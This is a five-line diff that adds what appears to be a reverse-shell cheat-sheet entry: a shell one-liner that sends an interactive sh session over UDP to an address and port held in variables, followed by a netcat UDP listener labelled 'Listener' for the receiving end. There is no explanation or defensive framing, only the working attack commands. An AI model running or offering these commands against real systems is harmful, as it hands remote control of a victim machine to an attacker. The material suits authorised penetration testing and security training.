@@ -1,0 +1,5 @@
+sh -i >& /dev/udp/$ip/$port 0>&1
+
+
+Listener:
+nc -u -lvp $port
